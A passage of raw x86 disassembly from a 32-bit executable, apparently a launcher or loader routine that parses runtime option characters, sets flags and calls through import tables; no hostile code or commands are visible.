  403730:	e8 db e6 ff ff       	call   0x401e10
  403735:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40373a:	e9 0a fc ff ff       	jmp    0x403349
  40373f:	c7 04 24 00 cb 40 00 	movl   $0x40cb00,(%esp)
  403746:	e8 c5 e6 ff ff       	call   0x401e10
  40374b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403750:	e9 f4 fb ff ff       	jmp    0x403349
  403755:	c7 04 24 44 cb 40 00 	movl   $0x40cb44,(%esp)
  40375c:	e8 af e6 ff ff       	call   0x401e10
  403761:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403766:	e9 de fb ff ff       	jmp    0x403349
  40376b:	c7 04 24 8c cb 40 00 	movl   $0x40cb8c,(%esp)
  403772:	e8 99 e6 ff ff       	call   0x401e10
  403777:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40377c:	e9 c8 fb ff ff       	jmp    0x403349
  403781:	c7 04 24 a0 cc 40 00 	movl   $0x40cca0,(%esp)
  403788:	e8 83 e6 ff ff       	call   0x401e10
  40378d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403792:	e9 b2 fb ff ff       	jmp    0x403349
  403797:	c7 04 24 e0 cc 40 00 	movl   $0x40cce0,(%esp)
  40379e:	e8 6d e6 ff ff       	call   0x401e10
  4037a3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4037a8:	e9 9c fb ff ff       	jmp    0x403349
  4037ad:	c7 04 24 1c cd 40 00 	movl   $0x40cd1c,(%esp)
  4037b4:	e8 57 e6 ff ff       	call   0x401e10
  4037b9:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4037be:	e9 86 fb ff ff       	jmp    0x403349
  4037c3:	c7 04 24 58 cd 40 00 	movl   $0x40cd58,(%esp)
  4037ca:	e8 41 e6 ff ff       	call   0x401e10
  4037cf:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4037d4:	e9 70 fb ff ff       	jmp    0x403349
  4037d9:	c7 04 24 94 cd 40 00 	movl   $0x40cd94,(%esp)
  4037e0:	e8 2b e6 ff ff       	call   0x401e10
  4037e5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4037ea:	e9 5a fb ff ff       	jmp    0x403349
  4037ef:	c7 04 24 18 cc 40 00 	movl   $0x40cc18,(%esp)
  4037f6:	e8 15 e6 ff ff       	call   0x401e10
  4037fb:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403800:	e9 44 fb ff ff       	jmp    0x403349
  403805:	c7 04 24 e0 c6 40 00 	movl   $0x40c6e0,(%esp)
  40380c:	e8 ff e5 ff ff       	call   0x401e10
  403811:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403816:	e9 2e fb ff ff       	jmp    0x403349
  40381b:	c7 04 24 d4 cb 40 00 	movl   $0x40cbd4,(%esp)
  403822:	e8 e9 e5 ff ff       	call   0x401e10
  403827:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40382c:	e9 18 fb ff ff       	jmp    0x403349
  403831:	c7 04 24 d0 cd 40 00 	movl   $0x40cdd0,(%esp)
  403838:	e8 d3 e5 ff ff       	call   0x401e10
  40383d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403842:	e9 02 fb ff ff       	jmp    0x403349
  403847:	c7 04 24 bc ce 40 00 	movl   $0x40cebc,(%esp)
  40384e:	e8 bd e5 ff ff       	call   0x401e10
  403853:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403858:	e9 ec fa ff ff       	jmp    0x403349
  40385d:	c7 04 24 14 ce 40 00 	movl   $0x40ce14,(%esp)
  403864:	e8 a7 e5 ff ff       	call   0x401e10
  403869:	83 c8 ff             	or     $0xffffffff,%eax
  40386c:	e9 d8 fa ff ff       	jmp    0x403349
  403871:	c7 04 24 00 cf 40 00 	movl   $0x40cf00,(%esp)
  403878:	e8 93 e5 ff ff       	call   0x401e10
  40387d:	83 c8 ff             	or     $0xffffffff,%eax
  403880:	e9 c4 fa ff ff       	jmp    0x403349
  403885:	c7 04 24 90 ce 40 00 	movl   $0x40ce90,(%esp)
  40388c:	e8 7f e5 ff ff       	call   0x401e10
  403891:	83 c8 ff             	or     $0xffffffff,%eax
  403894:	e9 b0 fa ff ff       	jmp    0x403349
  403899:	90                   	nop
  40389a:	90                   	nop
  40389b:	90                   	nop
  40389c:	90                   	nop
  40389d:	90                   	nop
  40389e:	90                   	nop
  40389f:	90                   	nop
  4038a0:	a1 98 10 41 00       	mov    0x411098,%eax
  4038a5:	ff e0                	jmp    *%eax
  4038a7:	89 f6                	mov    %esi,%esi
  4038a9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4038b0:	a1 9c 10 41 00       	mov    0x41109c,%eax
  4038b5:	ff e0                	jmp    *%eax
  4038b7:	89 f6                	mov    %esi,%esi
  4038b9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4038c0:	a1 3c 10 41 00       	mov    0x41103c,%eax
  4038c5:	ff e0                	jmp    *%eax
  4038c7:	89 f6                	mov    %esi,%esi
  4038c9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4038d0:	a1 48 10 41 00       	mov    0x411048,%eax
  4038d5:	ff e0                	jmp    *%eax
  4038d7:	89 f6                	mov    %esi,%esi
  4038d9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4038e0:	a1 4c 10 41 00       	mov    0x41104c,%eax
  4038e5:	ff e0                	jmp    *%eax
  4038e7:	90                   	nop
  4038e8:	90                   	nop
  4038e9:	90                   	nop
  4038ea:	90                   	nop
  4038eb:	90                   	nop
  4038ec:	90                   	nop
  4038ed:	90                   	nop
  4038ee:	90                   	nop
  4038ef:	90                   	nop
  4038f0:	55                   	push   %ebp
  4038f1:	57                   	push   %edi
  4038f2:	56                   	push   %esi
  4038f3:	53                   	push   %ebx
  4038f4:	50                   	push   %eax
  4038f5:	b8 38 20 00 00       	mov    $0x2038,%eax
  4038fa:	e8 51 6c 00 00       	call   0x40a550
  4038ff:	29 c4                	sub    %eax,%esp
  403901:	8b 04 04             	mov    (%esp,%eax,1),%eax
  403904:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40390b:	00 
  40390c:	89 c5                	mov    %eax,%ebp
  40390e:	8b 58 08             	mov    0x8(%eax),%ebx
  403911:	a1 cc 10 41 00       	mov    0x4110cc,%eax
  403916:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  403919:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  40391f:	a1 d4 10 41 00       	mov    0x4110d4,%eax
  403924:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  40392a:	a1 dc 10 41 00       	mov    0x4110dc,%eax
  40392f:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403935:	a1 c8 10 41 00       	mov    0x4110c8,%eax
  40393a:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403940:	a1 d0 10 41 00       	mov    0x4110d0,%eax
  403945:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  40394b:	a1 c0 10 41 00       	mov    0x4110c0,%eax
  403950:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  403956:	72 2e                	jb     0x403986
  403958:	e9 41 01 00 00       	jmp    0x403a9e
  40395d:	8d 76 00             	lea    0x0(%esi),%esi
  403960:	3c 75                	cmp    $0x75,%al
  403962:	74 5c                	je     0x4039c0
  403964:	3c 76                	cmp    $0x76,%al
  403966:	75 0b                	jne    0x403973
  403968:	a1 c0 10 41 00       	mov    0x4110c0,%eax
  40396d:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403973:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  403977:	89 2c 24             	mov    %ebp,(%esp)
  40397a:	e8 51 dc ff ff       	call   0x4015d0
  40397f:	39 45 0c             	cmp    %eax,0xc(%ebp)
  403982:	89 c3                	mov    %eax,%ebx
  403984:	76 6a                	jbe    0x4039f0
  403986:	80 7b 11 6f          	cmpb   $0x6f,0x11(%ebx)
  40398a:	75 e7                	jne    0x403973
  40398c:	8d 73 12             	lea    0x12(%ebx),%esi
  40398f:	bf 94 cf 40 00       	mov    $0x40cf94,%edi
  403994:	b9 04 00 00 00       	mov    $0x4,%ecx
  403999:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  40399b:	74 d6                	je     0x403973
  40399d:	0f b6 43 12          	movzbl 0x12(%ebx),%eax
  4039a1:	3c 57                	cmp    $0x57,%al
  4039a3:	74 2b                	je     0x4039d0
  4039a5:	7f b9                	jg     0x403960
  4039a7:	3c 4f                	cmp    $0x4f,%al
  4039a9:	75 c8                	jne    0x403973
  4039ab:	a1 c4 10 41 00       	mov    0x4110c4,%eax
  4039b0:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  4039b6:	eb bb                	jmp    0x403973
  4039b8:	90                   	nop
  4039b9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4039c0:	c7 44 24 1c 01 00 00 	movl   $0x1,0x1c(%esp)
  4039c7:	00 
  4039c8:	eb a9                	jmp    0x403973
  4039ca:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4039d0:	8b 15 74 d6 41 00    	mov    0x41d674,%edx
  4039d6:	85 d2                	test   %edx,%edx
  4039d8:	0f 84 d2 00 00 00    	je     0x403ab0
  4039de:	8d 43 14             	lea    0x14(%ebx),%eax
  4039e1:	89 04 24             	mov    %eax,(%esp)
  4039e4:	e8 f7 fe ff ff       	call   0x4038e0
  4039e9:	eb 88                	jmp    0x403973
  4039eb:	90                   	nop
  4039ec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4039f0:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4039f4:	85 c0                	test   %eax,%eax
  4039f6:	0f 84 a2 00 00 00    	je     0x403a9e
  4039fc:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  403a01:	89 04 24             	mov    %eax,(%esp)
  403a04:	e8 8f 6e 00 00       	call   0x40a898
  403a09:	8b 1d 00 e3 41 00    	mov    0x41e300,%ebx
  403a0f:	c7 44 24 04 00 80 00 	movl   $0x8000,0x4(%esp)
  403a16:	00 
  403a17:	89 04 24             	mov    %eax,(%esp)
  403a1a:	ff d3                	call   *%ebx
  403a1c:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  403a21:	83 c0 20             	add    $0x20,%eax
  403a24:	89 04 24             	mov    %eax,(%esp)
  403a27:	e8 6c 6e 00 00       	call   0x40a898
  403a2c:	c7 44 24 04 00 80 00 	movl   $0x8000,0x4(%esp)
  403a33:	00 
  403a34:	89 04 24             	mov    %eax,(%esp)
  403a37:	ff d3                	call   *%ebx
  403a39:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  403a3e:	83 c0 20             	add    $0x20,%eax
  403a41:	89 04 24             	mov    %eax,(%esp)
  403a44:	e8 57 6e 00 00       	call   0x40a8a0
  403a49:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  403a4e:	83 c0 40             	add    $0x40,%eax
  403a51:	89 04 24             	mov    %eax,(%esp)
  403a54:	e8 47 6e 00 00       	call   0x40a8a0
  403a59:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  403a5e:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403a65:	00 
  403a66:	89 04 24             	mov    %eax,(%esp)
  403a69:	e8 3a 6e 00 00       	call   0x40a8a8
  403a6e:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  403a73:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403a7a:	00 
  403a7b:	83 c0 20             	add    $0x20,%eax
  403a7e:	89 04 24             	mov    %eax,(%esp)
  403a81:	e8 22 6e 00 00       	call   0x40a8a8
  403a86:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  403a8b:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403a92:	00 
  403a93:	83 c0 40             	add    $0x40,%eax
  403a96:	89 04 24             	mov    %eax,(%esp)
  403a99:	e8 0a 6e 00 00       	call   0x40a8a8
  403a9e:	31 c0                	xor    %eax,%eax
  403aa0:	81 c4 3c 20 00 00    	add    $0x203c,%esp
  403aa6:	5b                   	pop    %ebx
  403aa7:	5e                   	pop    %esi
  403aa8:	5f                   	pop    %edi
  403aa9:	5d                   	pop    %ebp
  403aaa:	c3                   	ret
  403aab:	90                   	nop
  403aac:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403ab0:	8d 44 24 2e          	lea    0x2e(%esp),%eax
  403ab4:	8d 73 14             	lea    0x14(%ebx),%esi
  403ab7:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  403abe:	00 
  403abf:	89 74 24 04          	mov    %esi,0x4(%esp)
  403ac3:	89 04 24             	mov    %eax,(%esp)
  403ac6:	e8 e5 6d 00 00       	call   0x40a8b0
  403acb:	83 f8 ff             	cmp    $0xffffffff,%eax
  403ace:	74 12                	je     0x403ae2
  403ad0:	8d 44 24 2e          	lea    0x2e(%esp),%eax
  403ad4:	89 04 24             	mov    %eax,(%esp)
  403ad7:	ff 15 4c 10 41 00    	call   *0x41104c
  403add:	e9 91 fe ff ff       	jmp    0x403973
  403ae2:	89 74 24 04          	mov    %esi,0x4(%esp)
  403ae6:	c7 04 24 9c cf 40 00 	movl   $0x40cf9c,(%esp)
  403aed:	e8 1e e3 ff ff       	call   0x401e10
  403af2:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403af7:	eb a7                	jmp    0x403aa0
  403af9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403b00:	57                   	push   %edi
  403b01:	56                   	push   %esi
  403b02:	b8 50 10 00 00       	mov    $0x1050,%eax
  403b07:	53                   	push   %ebx
  403b08:	e8 43 6a 00 00       	call   0x40a550
  403b0d:	29 c4                	sub    %eax,%esp
  403b0f:	8b 9c 24 60 10 00 00 	mov    0x1060(%esp),%ebx
  403b16:	8b 43 24             	mov    0x24(%ebx),%eax
  403b19:	89 04 24             	mov    %eax,(%esp)
  403b1c:	ff 15 b8 e3 41 00    	call   *0x41e3b8
  403b22:	89 c7                	mov    %eax,%edi
  403b24:	8d 40 ec             	lea    -0x14(%eax),%eax
  403b27:	83 ec 04             	sub    $0x4,%esp
  403b2a:	8d 74 24 10          	lea    0x10(%esp),%esi
  403b2e:	83 f8 09             	cmp    $0x9,%eax
  403b31:	0f 96 c0             	setbe  %al
  403b34:	89 34 24             	mov    %esi,(%esp)
  403b37:	0f b6 c0             	movzbl %al,%eax
  403b3a:	a3 74 d6 41 00       	mov    %eax,0x41d674
  403b3f:	8d 43 28             	lea    0x28(%ebx),%eax
  403b42:	81 c3 68 30 00 00    	add    $0x3068,%ebx
  403b48:	89 44 24 04          	mov    %eax,0x4(%esp)
  403b4c:	e8 d7 6c 00 00       	call   0x40a828
  403b51:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  403b55:	8d 5c 24 50          	lea    0x50(%esp),%ebx
  403b59:	89 74 24 08          	mov    %esi,0x8(%esp)
  403b5d:	89 1c 24             	mov    %ebx,(%esp)
  403b60:	e8 3b ef ff ff       	call   0x402aa0
  403b65:	89 1c 24             	mov    %ebx,(%esp)
  403b68:	e8 63 10 00 00       	call   0x404bd0
  403b6d:	85 c0                	test   %eax,%eax
  403b6f:	74 16                	je     0x403b87
  403b71:	89 7c 24 04          	mov    %edi,0x4(%esp)
  403b75:	89 04 24             	mov    %eax,(%esp)
  403b78:	e8 13 f3 ff ff       	call   0x402e90
  403b7d:	81 c4 50 10 00 00    	add    $0x1050,%esp
  403b83:	5b                   	pop    %ebx
  403b84:	5e                   	pop    %esi
  403b85:	5f                   	pop    %edi
  403b86:	c3                   	ret
  403b87:	ff 15 34 e2 41 00    	call   *0x41e234
  403b8d:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  403b91:	89 44 24 08          	mov    %eax,0x8(%esp)
  403b95:	c7 04 24 e4 cf 40 00 	movl   $0x40cfe4,(%esp)
  403b9c:	e8 6f e2 ff ff       	call   0x401e10
  403ba1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403ba6:	eb d5                	jmp    0x403b7d
  403ba8:	90                   	nop
  403ba9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403bb0:	57                   	push   %edi
  403bb1:	56                   	push   %esi
  403bb2:	b8 20 10 00 00       	mov    $0x1020,%eax
  403bb7:	53                   	push   %ebx
  403bb8:	e8 93 69 00 00       	call   0x40a550
  403bbd:	29 c4                	sub    %eax,%esp
  403bbf:	8b bc 24 30 10 00 00 	mov    0x1030(%esp),%edi
  403bc6:	8b 47 24             	mov    0x24(%edi),%eax
  403bc9:	89 04 24             	mov    %eax,(%esp)
  403bcc:	ff 15 b8 e3 41 00    	call   *0x41e3b8
  403bd2:	83 ec 04             	sub    $0x4,%esp
  403bd5:	89 c6                	mov    %eax,%esi
  403bd7:	8d 5c 24 1f          	lea    0x1f(%esp),%ebx
  403bdb:	89 44 24 08          	mov    %eax,0x8(%esp)
  403bdf:	c7 44 24 04 12 d0 40 	movl   $0x40d012,0x4(%esp)
  403be6:	00 
  403be7:	89 1c 24             	mov    %ebx,(%esp)
  403bea:	e8 c9 6c 00 00       	call   0x40a8b8
  403bef:	89 1c 24             	mov    %ebx,(%esp)
  403bf2:	ff 15 3c e2 41 00    	call   *0x41e23c
  403bf8:	83 ec 04             	sub    $0x4,%esp
  403bfb:	85 c0                	test   %eax,%eax
  403bfd:	74 23                	je     0x403c22
  403bff:	89 74 24 04          	mov    %esi,0x4(%esp)
  403c03:	89 04 24             	mov    %eax,(%esp)
  403c06:	e8 85 f2 ff ff       	call   0x402e90
  403c0b:	8b 94 24 34 10 00 00 	mov    0x1034(%esp),%edx
  403c12:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  403c18:	81 c4 20 10 00 00    	add    $0x1020,%esp
  403c1e:	5b                   	pop    %ebx
  403c1f:	5e                   	pop    %esi
  403c20:	5f                   	pop    %edi
  403c21:	c3                   	ret
  403c22:	8b 84 24 34 10 00 00 	mov    0x1034(%esp),%eax
  403c29:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403c2f:	89 3c 24             	mov    %edi,(%esp)
  403c32:	e8 c9 fe ff ff       	call   0x403b00
  403c37:	81 c4 20 10 00 00    	add    $0x1020,%esp
  403c3d:	5b                   	pop    %ebx
  403c3e:	5e                   	pop    %esi
  403c3f:	5f                   	pop    %edi
  403c40:	c3                   	ret
  403c41:	eb 0d                	jmp    0x403c50
  403c43:	90                   	nop
  403c44:	90                   	nop
  403c45:	90                   	nop
  403c46:	90                   	nop
  403c47:	90                   	nop
  403c48:	90                   	nop
  403c49:	90                   	nop
  403c4a:	90                   	nop
  403c4b:	90                   	nop
  403c4c:	90                   	nop
  403c4d:	90                   	nop
  403c4e:	90                   	nop
  403c4f:	90                   	nop
  403c50:	55                   	push   %ebp
  403c51:	57                   	push   %edi
  403c52:	56                   	push   %esi
  403c53:	53                   	push   %ebx
  403c54:	83 ec 2c             	sub    $0x2c,%esp
  403c57:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403c5e:	00 
  403c5f:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  403c66:	8b 74 24 40          	mov    0x40(%esp),%esi
  403c6a:	8b 7c 24 44          	mov    0x44(%esp),%edi
  403c6e:	e8 4d 6c 00 00       	call   0x40a8c0
  403c73:	89 04 24             	mov    %eax,(%esp)
  403c76:	e8 4d 6c 00 00       	call   0x40a8c8
  403c7b:	85 c0                	test   %eax,%eax
  403c7d:	89 44 24 18          	mov    %eax,0x18(%esp)
  403c81:	0f 84 bb 00 00 00    	je     0x403d42
  403c87:	8d 04 b5 04 00 00 00 	lea    0x4(,%esi,4),%eax
  403c8e:	89 04 24             	mov    %eax,(%esp)
  403c91:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403c95:	e8 26 6b 00 00       	call   0x40a7c0
  403c9a:	85 c0                	test   %eax,%eax
  403c9c:	89 c3                	mov    %eax,%ebx
  403c9e:	0f 84 9e 00 00 00    	je     0x403d42
  403ca4:	c7 44 24 04 30 d0 40 	movl   $0x40d030,0x4(%esp)
  403cab:	00 
  403cac:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  403cb3:	31 ed                	xor    %ebp,%ebp
  403cb5:	e8 06 6c 00 00       	call   0x40a8c0
  403cba:	85 f6                	test   %esi,%esi
  403cbc:	7f 09                	jg     0x403cc7
  403cbe:	eb 50                	jmp    0x403d10
  403cc0:	83 c5 01             	add    $0x1,%ebp
  403cc3:	39 f5                	cmp    %esi,%ebp
  403cc5:	74 49                	je     0x403d10
  403cc7:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403cce:	00 
  403ccf:	8b 04 af             	mov    (%edi,%ebp,4),%eax
  403cd2:	89 04 24             	mov    %eax,(%esp)
  403cd5:	ff 15 30 10 41 00    	call   *0x411030
  403cdb:	85 c0                	test   %eax,%eax
  403cdd:	89 04 ab             	mov    %eax,(%ebx,%ebp,4)
  403ce0:	75 de                	jne    0x403cc0
  403ce2:	8b 44 24 18          	mov    0x18(%esp),%eax
  403ce6:	89 04 24             	mov    %eax,(%esp)
  403ce9:	e8 1a 6b 00 00       	call   0x40a808
  403cee:	8d 55 01             	lea    0x1(%ebp),%edx
  403cf1:	c7 04 24 34 d0 40 00 	movl   $0x40d034,(%esp)
  403cf8:	89 54 24 04          	mov    %edx,0x4(%esp)
  403cfc:	e8 0f e1 ff ff       	call   0x401e10
  403d01:	31 c0                	xor    %eax,%eax
  403d03:	83 c4 2c             	add    $0x2c,%esp
  403d06:	5b                   	pop    %ebx
  403d07:	5e                   	pop    %esi
  403d08:	5f                   	pop    %edi
  403d09:	5d                   	pop    %ebp
  403d0a:	c3                   	ret
  403d0b:	90                   	nop
  403d0c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403d10:	8b 7c 24 18          	mov    0x18(%esp),%edi
  403d14:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403d18:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  403d1f:	89 7c 24 04          	mov    %edi,0x4(%esp)
  403d23:	c7 44 03 fc 00 00 00 	movl   $0x0,-0x4(%ebx,%eax,1)
  403d2a:	00 
  403d2b:	e8 90 6b 00 00       	call   0x40a8c0
  403d30:	89 3c 24             	mov    %edi,(%esp)
  403d33:	e8 d0 6a 00 00       	call   0x40a808
  403d38:	83 c4 2c             	add    $0x2c,%esp
  403d3b:	89 d8                	mov    %ebx,%eax
  403d3d:	5b                   	pop    %ebx
  403d3e:	5e                   	pop    %esi
  403d3f:	5f                   	pop    %edi
  403d40:	5d                   	pop    %ebp
  403d41:	c3                   	ret
  403d42:	c7 04 24 21 d0 40 00 	movl   $0x40d021,(%esp)
  403d49:	e8 c2 e0 ff ff       	call   0x401e10
  403d4e:	31 c0                	xor    %eax,%eax
  403d50:	eb b1                	jmp    0x403d03
  403d52:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403d59:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  403d60:	56                   	push   %esi
  403d61:	53                   	push   %ebx
  403d62:	83 ec 14             	sub    $0x14,%esp
  403d65:	8b 74 24 20          	mov    0x20(%esp),%esi
  403d69:	8b 06                	mov    (%esi),%eax
  403d6b:	89 f3                	mov    %esi,%ebx
  403d6d:	85 c0                	test   %eax,%eax
  403d6f:	74 11                	je     0x403d82
  403d71:	89 04 24             	mov    %eax,(%esp)
  403d74:	83 c3 04             	add    $0x4,%ebx
  403d77:	e8 8c 6a 00 00       	call   0x40a808
  403d7c:	8b 03                	mov    (%ebx),%eax
  403d7e:	85 c0                	test   %eax,%eax
  403d80:	75 ef                	jne    0x403d71
  403d82:	89 74 24 20          	mov    %esi,0x20(%esp)
  403d86:	83 c4 14             	add    $0x14,%esp
  403d89:	5b                   	pop    %ebx
  403d8a:	5e                   	pop    %esi
  403d8b:	e9 78 6a 00 00       	jmp    0x40a808
  403d90:	e9 2b 14 00 00       	jmp    0x4051c0
  403d95:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403d99:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  403da0:	56                   	push   %esi
  403da1:	53                   	push   %ebx
  403da2:	83 ec 14             	sub    $0x14,%esp
  403da5:	a1 74 d6 41 00       	mov    0x41d674,%eax
  403daa:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  403dae:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  403db5:	00 
  403db6:	85 c0                	test   %eax,%eax
  403db8:	8d 43 68             	lea    0x68(%ebx),%eax
  403dbb:	89 44 24 04          	mov    %eax,0x4(%esp)
  403dbf:	74 22                	je     0x403de3
  403dc1:	c7 04 24 80 c2 41 00 	movl   $0x41c280,(%esp)
  403dc8:	e8 f3 17 00 00       	call   0x4055c0
  403dcd:	85 c0                	test   %eax,%eax
  403dcf:	0f 84 c3 02 00 00    	je     0x404098
  403dd5:	c7 04 24 80 c2 41 00 	movl   $0x41c280,(%esp)
  403ddc:	e8 cf fa ff ff       	call   0x4038b0
  403de1:	eb 21                	jmp    0x403e04
  403de3:	c7 04 24 40 a2 41 00 	movl   $0x41a240,(%esp)
  403dea:	e8 d1 13 00 00       	call   0x4051c0
  403def:	85 c0                	test   %eax,%eax
  403df1:	0f 84 a1 02 00 00    	je     0x404098
  403df7:	c7 04 24 40 a2 41 00 	movl   $0x41a240,(%esp)
  403dfe:	ff 15 9c 10 41 00    	call   *0x41109c
  403e04:	a1 74 d6 41 00       	mov    0x41d674,%eax
  403e09:	8d b3 68 30 00 00    	lea    0x3068(%ebx),%esi
  403e0f:	89 34 24             	mov    %esi,(%esp)
  403e12:	85 c0                	test   %eax,%eax
  403e14:	0f 84 f6 00 00 00    	je     0x403f10
  403e1a:	e8 19 6a 00 00       	call   0x40a838
  403e1f:	89 74 24 04          	mov    %esi,0x4(%esp)
  403e23:	89 44 24 08          	mov    %eax,0x8(%esp)
  403e27:	c7 04 24 00 82 41 00 	movl   $0x418200,(%esp)
  403e2e:	e8 35 6a 00 00       	call   0x40a868
  403e33:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  403e3a:	00 
  403e3b:	89 74 24 04          	mov    %esi,0x4(%esp)
  403e3f:	c7 04 24 80 51 41 00 	movl   $0x415180,(%esp)
  403e46:	e8 75 17 00 00       	call   0x4055c0
  403e4b:	85 c0                	test   %eax,%eax
  403e4d:	0f 84 a8 02 00 00    	je     0x4040fb
  403e53:	c7 04 24 80 51 41 00 	movl   $0x415180,(%esp)
  403e5a:	e8 41 fa ff ff       	call   0x4038a0
  403e5f:	89 d8                	mov    %ebx,%eax
  403e61:	e8 8a fa ff ff       	call   0x4038f0
  403e66:	ff 15 a8 10 41 00    	call   *0x4110a8
  403e6c:	8b 0d 74 d6 41 00    	mov    0x41d674,%ecx
  403e72:	85 c9                	test   %ecx,%ecx
  403e74:	0f 84 f6 01 00 00    	je     0x404070
  403e7a:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  403e81:	00 
  403e82:	c7 44 24 04 00 82 41 	movl   $0x418200,0x4(%esp)
  403e89:	00 
  403e8a:	c7 04 24 00 11 41 00 	movl   $0x411100,(%esp)
  403e91:	e8 2a 17 00 00       	call   0x4055c0
  403e96:	85 c0                	test   %eax,%eax
  403e98:	0f 84 12 02 00 00    	je     0x4040b0
  403e9e:	c7 04 24 00 11 41 00 	movl   $0x411100,(%esp)
  403ea5:	e8 16 fa ff ff       	call   0x4038c0
  403eaa:	8b 83 74 40 00 00    	mov    0x4074(%ebx),%eax
  403eb0:	8b 15 74 d6 41 00    	mov    0x41d674,%edx
  403eb6:	89 44 24 04          	mov    %eax,0x4(%esp)
  403eba:	8b 83 70 40 00 00    	mov    0x4070(%ebx),%eax
  403ec0:	85 d2                	test   %edx,%edx
  403ec2:	89 04 24             	mov    %eax,(%esp)
  403ec5:	0f 84 65 01 00 00    	je     0x404030
  403ecb:	e8 d0 17 00 00       	call   0x4056a0
  403ed0:	85 c0                	test   %eax,%eax
  403ed2:	89 c6                	mov    %eax,%esi
  403ed4:	0f 84 e7 01 00 00    	je     0x4040c1
  403eda:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  403ee1:	00 
  403ee2:	89 44 24 04          	mov    %eax,0x4(%esp)
  403ee6:	8b 83 70 40 00 00    	mov    0x4070(%ebx),%eax
  403eec:	89 04 24             	mov    %eax,(%esp)
  403eef:	e8 dc f9 ff ff       	call   0x4038d0
  403ef4:	89 34 24             	mov    %esi,(%esp)
  403ef7:	e8 0c 69 00 00       	call   0x40a808
  403efc:	ff 15 8c 10 41 00    	call   *0x41108c
  403f02:	85 c0                	test   %eax,%eax
  403f04:	0f 85 78 01 00 00    	jne    0x404082
  403f0a:	83 c4 14             	add    $0x14,%esp
  403f0d:	5b                   	pop    %ebx
  403f0e:	5e                   	pop    %esi
  403f0f:	c3                   	ret
  403f10:	e8 23 69 00 00       	call   0x40a838
  403f15:	89 74 24 04          	mov    %esi,0x4(%esp)
  403f19:	89 44 24 08          	mov    %eax,0x8(%esp)
  403f1d:	c7 04 24 00 82 41 00 	movl   $0x418200,(%esp)
  403f24:	e8 3f 69 00 00       	call   0x40a868
  403f29:	ba 00 82 41 00       	mov    $0x418200,%edx
  403f2e:	8b 0a                	mov    (%edx),%ecx
  403f30:	83 c2 04             	add    $0x4,%edx
